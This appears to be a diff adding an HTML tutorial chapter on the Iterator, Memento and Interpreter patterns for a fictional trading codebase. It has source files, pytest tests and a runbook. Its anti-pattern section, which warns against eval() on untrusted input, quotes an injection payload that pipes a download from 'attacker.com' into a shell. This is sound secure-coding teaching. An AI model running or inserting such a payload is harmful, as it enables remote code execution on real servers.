+                <div>│       │   ├── __init__.py</div>
+                <div>│       │   └── <span class="text-emerald-300 font-bold">iterator.py</span>          <span class="text-slate-500"># Milestone 09: Memory-Bounded Chunked Iterator</span></div>
+                <div>│       ├── <span class="text-emerald-300 font-bold">audit/</span></div>
+                <div>│       │   ├── __init__.py</div>
+                <div>│       │   └── <span class="text-emerald-300 font-bold">memento.py</span>           <span class="text-slate-500"># Milestone 09: Checkpoint Time-Travel Memento</span></div>
+                <div>│       └── <span class="text-emerald-300 font-bold">dsl/</span></div>
+                <div>│           ├── __init__.py</div>
+                <div>│           └── <span class="text-emerald-300 font-bold">interpreter.py</span>       <span class="text-slate-500"># Milestone 09: Financial Query DSL Interpreter</span></div>
+                <div>└── tests/</div>
+                <div>    └── <span class="text-purple-300 font-bold">test_behavioral_dsl.py</span>       <span class="text-slate-500"># Milestone 09 PyTest Verification Battery</span></div>
+            </div>
+
+            <!-- File 1: src/nexuscore/streams/iterator.py -->
+            <div class="space-y-2">
+                <div class="flex items-center justify-between text-xs font-mono">
+                    <span class="font-bold text-slate-800">1. Chunked Ledger Stream Iterator: <code class="text-purple-700">src/nexuscore/streams/iterator.py</code></span>
+                    <span class="text-slate-400">Iterator Pattern</span>
+                </div>
+                <pre class="bg-slate-900 text-slate-100 p-6 rounded-2xl font-mono text-xs overflow-x-auto leading-relaxed border border-slate-800 shadow-xl">
+<span class="text-slate-500"># ==============================================================================</span>
+<span class="text-slate-500"># NexusCore Streams - Memory-Bounded Chunked Iterator for Transaction Ledgers</span>
+<span class="text-slate-500"># ==============================================================================</span>
+
+<span class="text-purple-400">from</span> dataclasses <span class="text-purple-400">import</span> dataclass
+<span class="text-purple-400">from</span> typing <span class="text-purple-400">import</span> Iterator, List, Optional
+
+
+<span class="text-purple-400">@dataclass</span>(frozen=<span class="text-rose-400">True</span>)
+<span class="text-purple-400">class</span> <span class="text-emerald-400 font-bold">TransactionRecord</span>:
+    tx_id: str
+    symbol: str
+    amount: float
+    currency: str
+
+
+<span class="text-slate-500"># ------------------------------------------------------------------------------</span>
+<span class="text-slate-500"># THE ITERATOR</span>
+<span class="text-slate-500"># ------------------------------------------------------------------------------</span>
+<span class="text-purple-400">class</span> <span class="text-emerald-400 font-bold">TransactionLedgerIterator</span>(Iterator[TransactionRecord]):
+    <span class="text-slate-500">"""
+    MEMORY-SAFE STREAMING ITERATOR:
+    Traverses historical transaction ledgers by fetching small, fixed-size chunks
+    lazily on demand. Preserves O(1) constant memory usage regardless of dataset size!
+    """</span>
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">__init__</span>(self, total_records: int, chunk_size: int = 2):
+        self.total_records = total_records
+        self.chunk_size = chunk_size
+        self._current_offset: int = 0
+        self._buffer: List[TransactionRecord] = []
+        self._buffer_index: int = 0
+
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">__iter__</span>(self) -> <span class="text-amber-300">"TransactionLedgerIterator"</span>:
+        <span class="text-purple-400">return</span> self
+
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">__next__</span>(self) -> TransactionRecord:
+        <span class="text-slate-500"># If current buffer is exhausted, fetch next windowed chunk from storage</span>
+        <span class="text-purple-400">if</span> self._buffer_index &gt;= len(self._buffer):
+            <span class="text-purple-400">if</span> self._current_offset &gt;= self.total_records:
+                <span class="text-slate-500"># Python iterator protocol terminal signal</span>
+                <span class="text-purple-400">raise</span> StopIteration
+
+            self._fetch_next_chunk()
+
+        item = self._buffer[self._buffer_index]
+        self._buffer_index += 1
+        <span class="text-purple-400">return</span> item
+
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">_fetch_next_chunk</span>(self) -> <span class="text-rose-400">None</span>:
+        <span class="text-slate-500">"""Simulates paginated database query: SELECT ... LIMIT chunk_size OFFSET offset"""</span>
+        remaining = self.total_records - self._current_offset
+        fetch_count = min(self.chunk_size, remaining)
+        
+        <span class="text-slate-500"># Fill tiny buffer</span>
+        self._buffer = [
+            TransactionRecord(
+                tx_id=f<span class="text-amber-300">"tx_{self._current_offset + i}"</span>,
+                symbol=<span class="text-amber-300">"BTC/USD"</span>,
+                amount=float((self._current_offset + i + 1) * 100),
+                currency=<span class="text-amber-300">"USD"</span>
+            )
+            <span class="text-purple-400">for</span> i <span class="text-purple-400">in range</span>(fetch_count)
+        ]
+        self._current_offset += fetch_count
+        self._buffer_index = 0</pre>
+            </div>
+
+            <!-- File 2: src/nexuscore/audit/memento.py -->
+            <div class="space-y-2">
+                <div class="flex items-center justify-between text-xs font-mono">
+                    <span class="font-bold text-slate-800">2. Order Book Checkpoint Memento: <code class="text-purple-700">src/nexuscore/audit/memento.py</code></span>
+                    <span class="text-slate-400">Memento Pattern</span>
+                </div>
+                <pre class="bg-slate-900 text-slate-100 p-6 rounded-2xl font-mono text-xs overflow-x-auto leading-relaxed border border-slate-800 shadow-xl">
+<span class="text-slate-500"># ==============================================================================</span>
+<span class="text-slate-500"># NexusCore Audit - Memento Pattern for Order Book State Checkpoints &amp; Rollbacks</span>
+<span class="text-slate-500"># ==============================================================================</span>
+
+<span class="text-purple-400">import</span> copy
+<span class="text-purple-400">from</span> dataclasses <span class="text-purple-400">import</span> dataclass
+<span class="text-purple-400">from</span> typing <span class="text-purple-400">import</span> Dict, List, Any
+
+
+<span class="text-slate-500"># ------------------------------------------------------------------------------</span>
+<span class="text-slate-500"># THE MEMENTO (Opaque Snapshot)</span>
+<span class="text-slate-500"># ------------------------------------------------------------------------------</span>
+<span class="text-purple-400">@dataclass</span>(frozen=<span class="text-rose-400">True</span>)
+<span class="text-purple-400">class</span> <span class="text-emerald-400 font-bold">OrderBookMemento</span>:
+    <span class="text-slate-500">"""
+    MEMENTO VALUE OBJECT:
+    Stores an immutable snapshot of internal state.
+    Exposes no public mutators; caretaker cannot tamper with this data!
+    """</span>
+    _cash_balance: float
+    _positions: Dict[str, float]
+    _order_count: int
+
+
+<span class="text-slate-500"># ------------------------------------------------------------------------------</span>
+<span class="text-slate-500"># THE ORIGINATOR</span>
+<span class="text-slate-500"># ------------------------------------------------------------------------------</span>
+<span class="text-purple-400">class</span> <span class="text-emerald-400 font-bold">OrderBookOriginator</span>:
+    <span class="text-slate-500">"""
+    ORIGINATOR:
+    Holds live business state. Can capture its state into a Memento,
+    or revert its internal attributes completely from a Memento.
+    """</span>
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">__init__</span>(self, initial_cash: float):
+        self._cash_balance: float = initial_cash
+        self._positions: Dict[str, float] = {}
+        self._order_count: int = 0
+
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">execute_simulated_trade</span>(self, symbol: str, quantity: float, price: float) -> <span class="text-rose-400">None</span>:
+        cost = quantity * price
+        self._cash_balance -= cost
+        self._positions[symbol] = self._positions.get(symbol, 0.0) + quantity
+        self._order_count += 1
+
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">save_checkpoint</span>(self) -> OrderBookMemento:
+        <span class="text-slate-500">"""Creates an immutable memento snapshot of current state."""</span>
+        <span class="text-purple-400">return</span> OrderBookMemento(
+            _cash_balance=self._cash_balance,
+            _positions=copy.deepcopy(self._positions),
+            _order_count=self._order_count
+        )
+
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">restore_checkpoint</span>(self, memento: OrderBookMemento) -> <span class="text-rose-400">None</span>:
+        <span class="text-slate-500">"""Rolls back state completely from the provided memento."""</span>
+        self._cash_balance = memento._cash_balance
+        self._positions = copy.deepcopy(memento._positions)
+        self._order_count = memento._order_count
+
+    <span class="text-purple-400">@property</span>
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">balance</span>(self) -> float:
+        <span class="text-purple-400">return</span> self._cash_balance
+
+    <span class="text-purple-400">@property</span>
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">positions</span>(self) -> Dict[str, float]:
+        <span class="text-purple-400">return</span> dict(self._positions)
+
+
+<span class="text-slate-500"># ------------------------------------------------------------------------------</span>
+<span class="text-slate-500"># THE CARETAKER</span>
+<span class="text-slate-500"># ------------------------------------------------------------------------------</span>
+<span class="text-purple-400">class</span> <span class="text-emerald-400 font-bold">SimulationCaretaker</span>:
+    <span class="text-slate-500">"""
+    CARETAKER:
+    Stores mementos in an undo stack.
+    Never inspects or mutates memento contents!
+    """</span>
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">__init__</span>(self, originator: OrderBookOriginator):
+        self._originator = originator
+        self._history: List[OrderBookMemento] = []
+
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">backup</span>(self) -> <span class="text-rose-400">None</span>:
+        self._history.append(self._originator.save_checkpoint())
+
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">rollback</span>(self) -> bool:
+        <span class="text-purple-400">if not</span> self._history:
+            <span class="text-purple-400">return False</span>
+        latest_memento = self._history.pop()
+        self._originator.restore_checkpoint(latest_memento)
+        <span class="text-purple-400">return True</span></pre>
+            </div>
+
+            <!-- File 3: src/nexuscore/dsl/interpreter.py -->
+            <div class="space-y-2">
+                <div class="flex items-center justify-between text-xs font-mono">
+                    <span class="font-bold text-slate-800">3. Financial Query DSL Interpreter: <code class="text-purple-700">src/nexuscore/dsl/interpreter.py</code></span>
+                    <span class="text-slate-400">Interpreter Pattern (AST)</span>
+                </div>
+                <pre class="bg-slate-900 text-slate-100 p-6 rounded-2xl font-mono text-xs overflow-x-auto leading-relaxed border border-slate-800 shadow-xl">
+<span class="text-slate-500"># ==============================================================================</span>
+<span class="text-slate-500"># NexusCore DSL - Abstract Syntax Tree (AST) Query Interpreter Pattern</span>
+<span class="text-slate-500"># ==============================================================================</span>
+
+<span class="text-purple-400">from</span> abc <span class="text-purple-400">import</span> ABC, abstractmethod
+<span class="text-purple-400">from</span> typing <span class="text-purple-400">import</span> Any, Dict
+
+
+<span class="text-slate-500"># ------------------------------------------------------------------------------</span>
+<span class="text-slate-500"># BASE EXPRESSION INTERFACE</span>
+<span class="text-slate-500"># ------------------------------------------------------------------------------</span>
+<span class="text-purple-400">class</span> <span class="text-emerald-400 font-bold">IExpression</span>(ABC):
+    <span class="text-slate-500">"""Common interface for Terminal and Non-Terminal AST nodes."""</span>
+    <span class="text-purple-400">@abstractmethod</span>
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">interpret</span>(self, context: Dict[str, Any]) -> bool:
+        <span class="text-purple-400">pass</span>
+
+
+<span class="text-slate-500"># ------------------------------------------------------------------------------</span>
+<span class="text-slate-500"># TERMINAL EXPRESSIONS (Leaf Nodes in AST)</span>
+<span class="text-slate-500"># ------------------------------------------------------------------------------</span>
+<span class="text-purple-400">class</span> <span class="text-emerald-400 font-bold">EqualsExpression</span>(IExpression):
+    <span class="text-slate-500">"""Terminal rule: context[field] == value"""</span>
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">__init__</span>(self, field: str, value: Any):
+        self.field = field
+        self.value = value
+
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">interpret</span>(self, context: Dict[str, Any]) -> bool:
+        <span class="text-purple-400">return</span> context.get(self.field) == self.value
+
+
+<span class="text-purple-400">class</span> <span class="text-emerald-400 font-bold">GreaterThanExpression</span>(IExpression):
+    <span class="text-slate-500">"""Terminal rule: context[field] &gt; threshold"""</span>
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">__init__</span>(self, field: str, threshold: float):
+        self.field = field
+        self.threshold = threshold
+
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">interpret</span>(self, context: Dict[str, Any]) -> bool:
+        val = context.get(self.field)
+        <span class="text-purple-400">if</span> val <span class="text-purple-400">is None</span>:
+            <span class="text-purple-400">return False</span>
+        <span class="text-purple-400">return</span> float(val) &gt; self.threshold
+
+
+<span class="text-slate-500"># ------------------------------------------------------------------------------</span>
+<span class="text-slate-500"># NON-TERMINAL EXPRESSIONS (Composite Nodes in AST)</span>
+<span class="text-slate-500"># ------------------------------------------------------------------------------</span>
+<span class="text-purple-400">class</span> <span class="text-emerald-400 font-bold">AndExpression</span>(IExpression):
+    <span class="text-slate-500">"""Non-Terminal logical AND rule: left.interpret() and right.interpret()"""</span>
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">__init__</span>(self, left: IExpression, right: IExpression):
+        self.left = left
+        self.right = right
+
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">interpret</span>(self, context: Dict[str, Any]) -> bool:
+        <span class="text-purple-400">return</span> self.left.interpret(context) <span class="text-purple-400">and</span> self.right.interpret(context)
+
+
+<span class="text-purple-400">class</span> <span class="text-emerald-400 font-bold">OrExpression</span>(IExpression):
+    <span class="text-slate-500">"""Non-Terminal logical OR rule: left.interpret() or right.interpret()"""</span>
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">__init__</span>(self, left: IExpression, right: IExpression):
+        self.left = left
+        self.right = right
+
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">interpret</span>(self, context: Dict[str, Any]) -> bool:
+        <span class="text-purple-400">return</span> self.left.interpret(context) <span class="text-purple-400">or</span> self.right.interpret(context)
+
+
+<span class="text-purple-400">class</span> <span class="text-emerald-400 font-bold">NotExpression</span>(IExpression):
+    <span class="text-slate-500">"""Non-Terminal logical NOT rule: not expression.interpret()"""</span>
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">__init__</span>(self, expression: IExpression):
+        self.expression = expression
+
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">interpret</span>(self, context: Dict[str, Any]) -> bool:
+        <span class="text-purple-400">return not</span> self.expression.interpret(context)</pre>
+            </div>
+
+            <!-- File 4: tests/test_behavioral_dsl.py -->
+            <div class="space-y-2">
+                <div class="flex items-center justify-between text-xs font-mono">
+                    <span class="font-bold text-slate-800">4. Behavioral Verification Suite: <code class="text-purple-700">tests/test_behavioral_dsl.py</code></span>
+                    <span class="text-slate-400">PyTest Battery</span>
+                </div>
+                <pre class="bg-slate-900 text-slate-100 p-6 rounded-2xl font-mono text-xs overflow-x-auto leading-relaxed border border-slate-800 shadow-xl">
+<span class="text-purple-400">import</span> pytest
+<span class="text-purple-400">from</span> nexuscore.streams.iterator <span class="text-purple-400">import</span> TransactionLedgerIterator
+<span class="text-purple-400">from</span> nexuscore.audit.memento <span class="text-purple-400">import</span> OrderBookOriginator, SimulationCaretaker
+<span class="text-purple-400">from</span> nexuscore.dsl.interpreter <span class="text-purple-400">import</span> (
+    EqualsExpression, GreaterThanExpression, AndExpression, OrExpression, NotExpression
+)
+
+<span class="text-purple-400">class</span> <span class="text-emerald-400 font-bold">TestBehavioralFourSuite</span>:
+    <span class="text-slate-500">"""Verifies Iterator chunking, Memento state rollbacks, and Interpreter AST evaluations."""</span>
+
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">test_iterator_streams_records_without_memory_bloat</span>(self):
+        <span class="text-slate-500"># Iterate across 5 records using a chunk size of 2</span>
+        iterator = TransactionLedgerIterator(total_records=5, chunk_size=2)
+        records = [rec <span class="text-purple-400">for</span> rec <span class="text-purple-400">in</span> iterator]
+
+        assert len(records) == 5
+        assert records[0].tx_id == <span class="text-amber-300">"tx_0"</span>
+        assert records[4].tx_id == <span class="text-amber-300">"tx_4"</span>
+        assert records[4].amount == 500.0
+
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">test_memento_checkpoint_rollback_preserves_encapsulation</span>(self):
+        originator = OrderBookOriginator(initial_cash=100_000.0)
+        caretaker = SimulationCaretaker(originator)
+
+        <span class="text-slate-500"># 1. Save Initial Checkpoint</span>
+        caretaker.backup()
+
+        <span class="text-slate-500"># 2. Execute speculative trade</span>
+        originator.execute_simulated_trade(<span class="text-amber-300">"BTC"</span>, quantity=1.0, price=60_000.0)
+        assert originator.balance == 40_000.0
+        assert originator.positions[<span class="text-amber-300">"BTC"</span>] == 1.0
+
+        <span class="text-slate-500"># 3. Save Second Checkpoint</span>
+        caretaker.backup()
+
+        <span class="text-slate-500"># 4. Execute disastrous catastrophic trade</span>
+        originator.execute_simulated_trade(<span class="text-amber-300">"MEME"</span>, quantity=4000.0, price=10.0)
+        assert originator.balance == 0.0
+
+        <span class="text-slate-500"># 5. Rollback step 4 &rarr; restores to Checkpoint 2 ($40k balance)</span>
+        caretaker.rollback()
+        assert originator.balance == 40_000.0
+        assert <span class="text-amber-300">"MEME"</span> <span class="text-purple-400">not in</span> originator.positions
+
+        <span class="text-slate-500"># 6. Rollback step 2 &rarr; restores to Checkpoint 1 ($100k balance)</span>
+        caretaker.rollback()
+        assert originator.balance == 100_000.0
+        assert len(originator.positions) == 0
+
+    <span class="text-purple-400">def</span> <span class="text-sky-300 font-bold">test_interpreter_evaluates_complex_ast_expressions</span>(self):
+        <span class="text-slate-500"># Target Rule: (amount &gt; 10000 AND currency == 'USD') OR symbol == 'BTC'</span>
+        ast_rule = OrExpression(
+            left=AndExpression(
+                left=GreaterThanExpression(<span class="text-amber-300">"amount"</span>, 10000.0),
+                right=EqualsExpression(<span class="text-amber-300">"currency"</span>, <span class="text-amber-300">"USD"</span>)
+            ),
+            right=EqualsExpression(<span class="text-amber-300">"symbol"</span>, <span class="text-amber-300">"BTC"</span>)
+        )
+
+        <span class="text-slate-500"># Context 1: Large USD trade &rarr; True</span>
+        ctx_large_usd = {<span class="text-amber-300">"amount"</span>: 25000.0, <span class="text-amber-300">"currency"</span>: <span class="text-amber-300">"USD"</span>, <span class="text-amber-300">"symbol"</span>: <span class="text-amber-300">"ETH"</span>}
+        assert ast_rule.interpret(ctx_large_usd) <span class="text-purple-400">is True</span>
+
+        <span class="text-slate-500"># Context 2: Small USD trade &rarr; False</span>
+        ctx_small_usd = {<span class="text-amber-300">"amount"</span>: 5000.0, <span class="text-amber-300">"currency"</span>: <span class="text-amber-300">"USD"</span>, <span class="text-amber-300">"symbol"</span>: <span class="text-amber-300">"ETH"</span>}
+        assert ast_rule.interpret(ctx_small_usd) <span class="text-purple-400">is False</span>
+
+        <span class="text-slate-500"># Context 3: Small EUR trade on BTC &rarr; True (matches OR branch)</span>
+        ctx_btc_eur = {<span class="text-amber-300">"amount"</span>: 100.0, <span class="text-amber-300">"currency"</span>: <span class="text-amber-300">"EUR"</span>, <span class="text-amber-300">"symbol"</span>: <span class="text-amber-300">"BTC"</span>}
+        assert ast_rule.interpret(ctx_btc_eur) <span class="text-purple-400">is True</span></pre>
+            </div>
+        </section>
+
+        <!-- Common Gotchas & Architectural Anti-Patterns -->
+        <section id="gotchas" class="space-y-6">
+            <div class="border-b border-slate-200 pb-3">
+                <span class="text-rose-600 font-mono text-xs font-bold uppercase tracking-wider">Warning Track</span>
+                <h2 class="text-3xl font-bold text-slate-900 mt-1">Beginner Pitfalls &amp; Architectural Anti-Patterns</h2>
+            </div>
+
+            <div class="grid md:grid-cols-2 gap-6">
+                <!-- Anti-Pattern 1 -->
+                <div class="bg-rose-50 border-l-4 border-rose-500 p-6 rounded-r-2xl space-y-3">
+                    <div class="text-rose-900 font-bold flex items-center gap-2">
+                        <span>&#10060;</span>
+                        <span>Evaluating Untrusted Strings with eval()</span>
+                    </div>
+                    <p class="text-xs text-rose-800">
+                        Writing <code class="font-mono bg-rose-100 px-1 py-0.5 rounded text-rose-900">is_valid = eval(rule_string, context)</code> to process user-defined filtering rules.
+                    </p>
+                    <p class="text-xs text-rose-900 leading-relaxed font-sans">
+                        <strong>Why this causes security breaches:</strong> Python's <code class="font-mono">eval()</code> provides full execution access to built-in functions. A malicious user submitting a payload like <code class="font-mono text-rose-950">__import__('os').system('curl attacker.com | sh')</code> gains root shell access over your server container. Always parse dynamic DSL expressions into an AST of safe <strong>Interpreter classes</strong>!
+                    </p>
+                </div>
+
+                <!-- Anti-Pattern 2 -->
+                <div class="bg-rose-50 border-l-4 border-rose-500 p-6 rounded-r-2xl space-y-3">
+                    <div class="text-rose-900 font-bold flex items-center gap-2">
+                        <span>&#10060;</span>
+                        <span>Exposing Mutable Memento State to Caretakers</span>
+                    </div>
+                    <p class="text-xs text-rose-800">
+                        Designing a Memento that returns raw references to mutable dictionaries without performing a deep copy: <code class="font-mono bg-rose-100 px-1 py-0.5 rounded text-rose-900">return Memento(self.positions)</code>.
+                    </p>
+                    <p class="text-xs text-rose-900 leading-relaxed font-sans">
+                        <strong>Why this corrupts state rollbacks:</strong> If the Originator subsequently modifies <code class="font-mono">self.positions["BTC"] += 5</code>, the saved Memento's internal dictionary mutates simultaneously because both point to the exact same memory address! When you roll back, the state has already been corrupted. <strong>Mementos must be strictly immutable and deep-copied!</strong>
+                    </p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Interactive Verification & Terminal Runbook -->
+        <section id="runbook" class="bg-slate-900 text-white p-8 rounded-3xl space-y-6">
+            <div class="border-b border-slate-800 pb-3">
+                <span class="text-emerald-400 font-mono text-xs font-bold uppercase tracking-wider">Runbook</span>
+                <h2 class="text-2xl font-bold mt-1">Executing &amp; Validating NexusCore Milestone 09</h2>
+            </div>
+
+            <p class="text-slate-300 text-sm font-sans">
+                Follow these terminal commands to execute the Iterator, Memento, and Interpreter test battery:
+            </p>
+
+            <div class="space-y-4 font-mono text-xs">
+                <!-- Step 1: Run PyTest Battery -->
+                <div>
+                    <span class="text-slate-500"># 1. Execute the Behavioral Patterns IV test suite:</span>
+                    <div class="bg-slate-950 p-3 rounded-lg border border-slate-800 text-emerald-400 mt-1 overflow-x-auto">
+                        pytest tests/test_behavioral_dsl.py -v --tb=short
+                    </div>
+                    <span class="text-slate-500 text-[11px] mt-1 block font-sans">
+                        Expected output: 3 passed in ~0.04s. Confirms streaming chunk iteration, time-travel memento rollback, and AST rule interpretation!
+                    </span>
+                </div>
+
+                <!-- Step 2: Interactive REPL Demonstration -->
+                <div>
+                    <span class="text-slate-500"># 2. Test DSL AST evaluation in Python REPL:</span>
+                    <div class="bg-slate-950 p-3 rounded-lg border border-slate-800 text-sky-300 mt-1 overflow-x-auto">
+                        python -c "from nexuscore.dsl.interpreter import GreaterThanExpression, EqualsExpression, AndExpression; expr = AndExpression(GreaterThanExpression('amount', 5000), EqualsExpression('currency', 'USD')); print('Rule Match:', expr.interpret({'amount': 12000, 'currency': 'USD'}))"
+                    </div>
+                    <span class="text-slate-500 text-[11px] mt-1 block font-sans">
+                        Outputs: <code class="text-emerald-400 font-mono">Rule Match: True</code> evaluated safely through an AST!
+                    </span>
+                </div>
+            </div>
+        </section>
+
+        <!-- Chapter Summary & Teaser for Chapter 10 -->
+        <section class="border-t border-slate-200 pt-8 flex flex-col sm:flex-row items-center justify-between gap-4">
+            <div>
+                <span class="text-xs font-mono font-bold text-slate-400 uppercase">Up Next</span>
+                <h4 class="text-lg font-bold text-slate-900">Chapter 10: Enterprise Persistence Patterns: Repository, Unit of Work &amp; Data Mapper</h4>
+                <p class="text-xs text-slate-500 font-sans">Entering Fowler's Enterprise Architecture: Decoupling domain entities from database ORMs, managing atomic transactions with Unit of Work, and orchestrating async SQLAlchemy 2.0 repositories.</p>
+            </div>
+            <a href="Chapter 10 - Enterprise Persistence Patterns - Repository, Unit of Work and Data Mapper.html" class="inline-flex items-center gap-2 px-5 py-2.5 rounded-xl bg-slate-900 text-emerald-400 hover:bg-slate-800 font-mono text-xs font-bold transition shadow-md shrink-0">
+                Continue to Chapter 10 &rarr;
+            </a>
+        </section>
+
+    </main>
+</body>
+</html>
